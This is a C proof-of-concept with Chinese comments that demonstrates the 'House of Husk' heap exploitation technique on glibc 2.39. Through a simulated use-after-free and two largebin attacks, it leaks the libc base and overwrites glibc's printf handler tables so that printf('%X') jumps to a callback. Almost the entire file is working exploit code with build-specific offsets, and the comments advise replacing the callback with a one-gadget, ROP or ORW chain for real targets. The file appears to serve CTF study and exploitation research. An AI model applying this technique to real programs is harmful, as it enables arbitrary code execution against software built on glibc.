/*
 * 中文阅读提示：glibc 2.39：注意发行版补丁级不同也可能导致偏移变化。
 * 漏洞模型是 UAF 改 bk_nextsize；成功判据是两张 printf handler 全局指针
 * 都被写成受控 heap chunk，随后格式说明符索引到 backdoor。
 * 运行前必须用 readelf/nm/debug symbols 重算 MAIN_ARENA、PRINTF_* 偏移；
 * 同为 glibc 2.xx 并不保证作者给出的发行版偏移可直接使用。
 *
 * 分阶段阅读：
 *   1. 分配两组同 largebin 内“一大一小”的 chunk，并用 guard 隔开；
 *   2. free 大块后从 unsorted fd 泄露 main_arena，反算 libc 基址；
 *   3. 第一轮改大块 bk_nextsize，把小块地址写到 __printf_function_table；
 *   4. 第二轮把带有 callback 的 fake table 写到 __printf_arginfo_table；
 *   5. printf 解析指定格式符时按字符索引两张表，命中 backdoor。
 *
 * 代码中的 p1[3] 是用户区起算第 4 个 qword，对应 chunk header 的
 * bk_nextsize；target-0x20 来自 largebin 插入时写 bk_nextsize->fd_nextsize。
 */
/*
 * 标题：现代 glibc 上通过 Largebin Attack 实现 House of Husk。
 * 作者：Axura。
 * 目标构建：glibc-2.39-0ubuntu9 (Ubuntu 24.10)。
 * 目的：攻击链一，通过 Largebin Attack 劫持 __printf_arginfo_table。
 * 原文链接：https://4xura.com/pwn/house-of-husk/
 *
 * 本 PoC 用 backdoor() 回调提供稳定、可断言的控制流成功判据；
 * 真题可替换为栈帧调整后的 one-gadget、ROP、ORW 或其他满足约束的 gadget。
 * 
 * 编译命令：gcc -no-pie -fno-PIE -O0 -g -o house_of_husk_1_glibc-2.39 house_of_husk_1_glibc-2.39.c
 */

#include <assert.h>
#include <complex.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/types.h>
#include <unistd.h>

/* 下列 hidden 符号偏移绑定具体 Build ID；换 glibc 必须从对应 libc 重新提取。 */
#define MAIN_ARENA         0x203ac0
#define MAIN_ARENA_DELTA   0x60
#define PRINTF_ARGINFO_T   0x205668
#define PRINTF_FUNCTION_T  0x205660

static volatile int backdoor_hit;

void backdoor()
{
	static const char marker[] = "[+] HUSK_2.39_CALLBACK\n";
	backdoor_hit++;
	write(STDOUT_FILENO, marker, sizeof(marker) - 1);
}

int main(void)
{
	/* 关闭标准流缓冲，防止 stdio 隐式堆活动干扰 largebin 堆风水。 */
	setvbuf(stdin,NULL,_IONBF,0);
	setvbuf(stdout,NULL,_IONBF,0);
	setvbuf(stderr,NULL,_IONBF,0);

	size_t *p1 = malloc(0x428);

	size_t *g1 = malloc(0x18);  // 保护块隔开第一组 p1 与 p2，防止释放时合并。

	size_t *p2 = malloc(0x418);

	size_t *g2 = malloc(0x18);   // 保护块隔开 p2 与下一组 large chunk。

	size_t *p3 = malloc(0x488);

	size_t *g3 = malloc(0x18);  // 保护块隔开第二组 p3 与 p4。
	size_t *p4 = malloc(0x478);

	size_t *g4 = malloc(0x18);  // 尾部保护块防止 p4 与 top 合并。

	free(p1);

	unsigned long libc_base;
	// unsorted fd 指向 main_arena+0x60；减去对应 Build ID 的偏移即可得到 libc 基址。
	libc_base = *p1 - MAIN_ARENA - MAIN_ARENA_DELTA;

	size_t *g5 = malloc(0x438);

	free(p2);

	p1[3] = (size_t)(libc_base + PRINTF_FUNCTION_T- 0x20);

	size_t *g6 = malloc(0x438);

	assert((size_t)(p2-2) == *(size_t *)(libc_base+PRINTF_FUNCTION_T));

	size_t backdoor_addr = (size_t)&backdoor;
	// 在伪 function table 的 'X' 槽写入回调地址，后续 printf("%X") 会按字符索引到这里。
	*(size_t *)(p4 + ('X' - 2)) = backdoor_addr;

	free(p3);
	size_t *g7 = malloc(0x498);
	free(p4);

	p3[3] = (size_t)(libc_base + PRINTF_ARGINFO_T- 0x20);

	size_t *g8 = malloc(0x498);

	assert((size_t)(p4-2) == *(size_t *)(libc_base+PRINTF_ARGINFO_T));

	getchar();
	printf("%X", 0);  // 解析格式符时若表劫持成功，应调用 backdoor；随后用计数断言。
	assert(backdoor_hit >= 1);

	return 0;
}
